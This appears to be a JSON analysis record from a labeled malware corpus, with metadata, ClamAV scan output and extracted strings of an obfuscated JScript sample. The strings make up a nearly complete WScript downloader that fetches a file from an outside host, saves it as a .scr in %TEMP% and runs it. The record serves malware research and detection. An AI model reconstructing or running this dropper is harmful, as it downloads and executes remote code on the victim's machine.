{
    "filepath": "/corpus/malware/family_1/12688ac9766a0ef00fd6e7ffaebf63a1d7ff13b691a9c0815f7769ef6c4e4e6c",
    "fileinfo": {
        "labels": {
            "family": "family_1",
            "software": "malware"
        },
        "md5": "55ad18e73f55d184becc101dc68a3354",
        "type": "ASCII text, with very long lines, with CRLF line terminators",
        "clamav": "OK"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {}
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "professionClan = (((17 ^ 33) * 2 * 3 + (37 - 33)), this)": 1,
                "absurdAmorphous = (\"\\u0069n\\u0073tru\\u0063\\u0074\\u006f\\u0072\", \"c\\u0072is\\u0069\\u0073\", \"R\\u0075\\u006e\")": 1,
                "operativeInstrument = professionClan[(\"c\\u006ci\\u0070\", \"i\\u006e\\u0066\\u006frm\", \"vi\\u0062\\u0072\\u0061t\\u0069o\\u006e\", \"\\u0057\\u0053\\u0063\\u0072i\\u0070\\u0074\")]": 1,
                "operativeInstrument[(\"\\u0074r\\u0061\\u0063\\u0074\", \"\\u0053\\u006c\\u0065e\\u0070\")]((((((([!+[] + !+[]])) + \"\" + (([+!+[]])) + \"\" + (([+!+[]])))) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])) + ((((([!+[] + !+[] + !+[]])) + \"\" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])) + \"\" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)))) * ([!+[] + !+[] + !+[]]) * (((([+!+[]])) + \"\" + (([+!+[]])))))))": 1,
                "vacancyAbsorption = operativeInstrument[(\"\\u0063\\u0061p\\u0069t\\u0075l\\u0061ti\\u006f\\u006e\", \"c\\u0061\\u006e\\u0061l\", \"Creat\\u0065Objec\\u0074\")]((\"\\u0064evil\", \"\\u0057\\u0053\\u0063ri\\u0070t\\u002eS\\u0068el\\u006c\"))": 1,
                "regressionTypical = vacancyAbsorption[(\"\\u0072\\u0065\\u0073er\\u0076\\u006f\\u0069r\", \"\\u0045\\u0078p\\u0061n\\u0064\\u0045n\\u0076\\u0069\\u0072\\u006f\\u006emen\\u0074\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067s\")]((\"p\\u0072\\u0065\\u006diu\\u006d\", \"\\u0066\\u006fr\\u0075\\u006d\", \"\\u0070rod\\u0075c\\u0065\", \"%TE\\u004dP%/\")) + (\"s\\u0065\\u0063\\u0072\\u0065\\u0074\", \"\\u0065\\u0078pert\\u0069s\\u0065\\u0043\\u0079linder\") + (\"c\\u0075r\\u0073i\\u0076e\", \"\\u0061rtist\", \"\\u002esc\\u0072\")": 1,
                "apostropheVariation = professionClan[(\"\\u0063ol\\u006ce\\u0063\\u0074\\u0069ve\", \"\\u0074e\\u0072\\u0072i\\u0074\\u006fr\\u0079\", \"\\u0063o\\u006c\\u006fny\", \"firm\", \"W\\u0053c\\u0072\\u0069p\\u0074\")][(\"\\u0070\\u0061s\\u0073iv\\u0065\", \"\\u0061\\u0062\\u006fr\\u0074\", \"pr\\u0065\\u0066i\\u0078\", \"a\\u0062\\u0073\\u006frp\\u0074i\\u006fn\", \"\\u0043\\u0072\\u0065at\\u0065Ob\\u006a\\u0065\\u0063\\u0074\")]((\"M\\u0053X\\u004d\\u004c2.X\\u004d\\u004c\\u0048\\u0054TP\"))": 1,
                "apostropheVariation[(\"v\\u0065to\", \"mo\\u0064ern\", \"im\\u0070o\\u0072t\", \"\\u0070\\u0072\\u006fv\\u0069n\\u0063\\u0065\", \"o\\u0070\\u0065\\u006e\")]((\"exp\\u0065\\u0072im\\u0065\\u006et\", \"\\u0073\\u0061nc\\u0074\\u0069on\", \"\\u0074ro\\u0070\\u0068\\u0079\", \"\\u0047E\\u0054\"), (\"h\\u0074tp://\\u0072md\\u0073\\u007a\\u006ds.r\\u006f/\\u0032/87y\\u0076\\u0035cds\"), !(10 == (((([!+[] + !+[]]) * (((([+!+[]])) + \"\" + (([+[]])) + \"\" + (([!+[] + !+[] + !+[]]))))), (((574 / 41) - (0 | 14)) / ((504 / 28) + (0 | 5)))) | ((((6 | 6)) ^ ((188 / 47) | (8 | 4))) | (((40 - 40) | (0 ^ 0)) | ((47 - 46) * 0))))))": 1,
                "apostropheVariation[(\"\\u0074\\u0072\\u0061\\u006e\\u0073it\", \"\\u0073\\u0065nd\")]()": 1,
                "while (apostropheVariation[(\"\\u0072\\u0065\\u0061\\u0064ys\\u0074a\\u0074\\u0065\")] < ((0 + 1) ^ (5 + 0))) {": 1,
                "professionClan[(\"\\u0062ar\\u0062a\\u0072\\u0069\\u0061n\", \"WScr\\u0069\\u0070\\u0074\")][(\"Slee\\u0070\")]((2 + 0) * 5 * (68, 213, 217, 5) * 2)": 1,
                "operatorBureau = professionClan[(\"WS\\u0063\\u0072\\u0069\\u0070t\")][(\"\\u0069nfinit\\u0069v\\u0065\", \"Cre\\u0061\\u0074\\u0065Ob\\u006a\\u0065\\u0063t\")]((\"\\u0069\\u006e\\u0064e\\u0078\", \"\\u0041\\u0044OD\\u0042.S\\u0074r\\u0065a\\u006d\"))": 1,
                "operatorBureau[(\"\\u0074\\u0065\\u006dp\\u0065r\\u0061\\u0074\\u0075re\", \"\\u006dinu\\u0073\", \"o\\u0070\\u0065n\")]()": 1,
                "operatorBureau[(\"age\\u006e\\u0074\", \"t\\u0079\\u0070\\u0065\")] = ((0 | 1) + 0)": 1,
                "operatorBureau[(\"\\u0072\\u0065\\u0061\\u006c\", \"\\u0067\\u0065n\\u0065r\\u0061t\\u006fr\", \"\\u0061\\u0064\\u0065quat\\u0065\", \"\\u0072\\u0065gu\\u006ca\\u0074\\u0065\", \"w\\u0072\\u0069t\\u0065\")](apostropheVariation[(\"\\u0073\\u0074\\u006f\\u0072m\", function String.prototype.manifestAssembly() {": 1,
                "return this": 1,
                "}, \"Respon\\u0073\\u0065\\u0042\\u006fdy\")])": 1,
                "operatorBureau[(\"\\u0070\\u006fs\\u0069ti\\u006fn\")] = 0": 1,
                "operatorBureau[(\"\\u0074\\u0075n\\u006e\\u0065\\u006c\", \"m\\u0065\\u006do\\u0069\\u0072\\u0073\", \"\\u0065\\u0073s\\u0061\\u0079\", \"\\u0062o\\u0061t\", \"\\u0073\\u0061\\u0076\\u0065\\u0054o\\u0046i\\u006ce\")](regressionTypical, ((([+[]])) + (([!+[] + !+[]]))))": 1,
                "operatorBureau[(\"m\\u0065\\u006doi\\u0072\\u0073\", \"\\u0063\\u006cos\\u0065\")]()": 1,
                "vacancyAbsorption[absurdAmorphous](regressionTypical.manifestAssembly(), ((22 / 22) * (0 + 0)), (([+[]])))": 1,
                "} catch (dessertRespectable) {}": 1,
                "word: professionclan": 5,
                "word: absurdamorphous": 2,
                "word: operativeinstrument": 3,
                "word: vacancyabsorption": 3,
                "word: regressiontypical": 3,
                "word: linder": 1,
                "word: apostrophevariation": 5,
                "word: operatorbureau": 7,
                "word: nfinit": 1,
                "word: function": 1,
                "word: string": 1,
                "word: prototype": 1,
                "word: manifestassembly": 2,
                "word: return": 1,
                "word: respon": 1,
                "word: dessertrespectable": 1,
                "special: String.prototype.manifestAssembly": 1,
                "special: regressionTypical.manifestAssembly": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "clamav: bytecode: JIT disabled": 1,
                "clamav: Cannot prepare for JIT, LLVM is not compiled or not linked": 1,
                "clamav: Bytecode: 0 bytecode prepared with JIT, 94 prepared with interpreter, 94 total": 1,
                "clamav: Recognized ASCII text": 1,
                "clamav: cli_scanscript: saving normalized file to ./temp/clamav-81783f60cd121da4c0ac2bda9b5f9ea9.tmp": 1,
                "clamav: cli_magic_scandesc: returning 0  at line 2???": 1,
                "clamav: OK": 1,
                "clamav: Scanned files: 1": 1,
                "clamav: Infected files: 0": 1
            }
        }
    ]
}